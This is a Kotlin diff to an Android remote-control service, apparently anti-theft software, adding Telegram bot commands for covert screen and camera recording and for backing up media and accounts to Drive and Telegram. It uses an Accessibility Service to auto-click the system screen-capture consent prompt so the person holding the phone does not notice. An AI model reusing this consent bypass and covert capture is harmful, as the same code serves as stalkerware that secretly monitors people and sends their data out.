@@ -158,6 +158,52 @@ class BotCommandListener : Service() {
             return
         }
 
+        // /screenrecord alohida — duration parametr oladi (/screenrecord 30)
+        if (cmd.startsWith("/screenrecord") || cmd.startsWith("/screen")) {
+            // /screenrecord [soniya] [cam]   masalan: /screenrecord 30 cam
+            val parts       = cmd.split("\\s+".toRegex())
+            val durationSec = parts.firstOrNull { it.toIntOrNull() != null }
+                ?.toInt()?.coerceIn(5, ScreenRecordService.MAX_DURATION_S) ?: 20
+            val camFlag     = parts.any { it.lowercase() == "cam" }
+            // Accessibility Service avtomatik "Hozir boshlash" bosadi — o'g'iri ko'rmaydi
+            VolumeKeyAccessibilityService.autoClickScreenRecord = true
+
+            val permIntent  = Intent(this, ScreenRecordPermissionActivity::class.java).apply {
+                putExtra(ScreenRecordService.EXTRA_DURATION_SEC, durationSec)
+                putExtra(ScreenRecordService.EXTRA_SEND_TELEGRAM, true)
+                putExtra(ScreenRecordService.EXTRA_WITH_CAMERA, camFlag)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+            }
+            startActivity(permIntent)
+            TelegramSender.sendMessage(token, chatId, "🖥️ Ekran yozuvi boshlandi ($durationSec s)...")
+            return
+        }
+
+        // /backup — media fayllarni Drive + Telegram'ga zaxiralaydi
+        if (cmd == "/backup") {
+            if (BackupJob.isRunning) {
+                TelegramSender.sendMessage(token, chatId, "⚠️ Backup allaqachon jarayonda, kuting...")
+            } else {
+                TelegramSender.sendMessage(token, chatId,
+                    "⏳ Backup boshlandi...\n≥20 MB → Google Drive, <20 MB → Telegram")
+                BackupJob.start(this)
+            }
+            return
+        }
+
+        // /restore {...} — JSON'dan sozlamalarni tiklaydi
+        if (cmd.startsWith("/restore")) {
+            val json = text.substringAfter("/restore").trim()
+            if (json.isEmpty()) {
+                TelegramSender.sendMessage(token, chatId,
+                    "ℹ️ /restore {json} — zaxira JSON'ini /restore dan keyin yuboring")
+                return
+            }
+            val (ok, msg) = BackupHelper.restoreFromJson(this, json)
+            TelegramSender.sendMessage(token, chatId, msg)
+            return
+        }
+
         when (cmd) {
             "/alarm", "/signal" -> {
                 startForegroundService(Intent(this, AlarmService::class.java))
@@ -187,6 +233,9 @@ class BotCommandListener : Service() {
                     /location — faqat joylashuv
                     /photo — surat ol (old + orqa)
                     /video [soniya] — video yoz (masalan: /video 30, default 15s)
+                    /screenrecord [soniya] [cam] — ekranni yoz (masalan: /screenrecord 30 cam, cam = old kamera ham)
+                    /backup — sozlamalar + akkauntlar zaxira nusxasini yuboradi
+                    /restore {json} — zaxira JSON'dan sozlamalarni tiklaydi
                     /audio — ovoz yozish
                     /alarm — jiringlatish
                     /lock — ekranni darhol qulflash
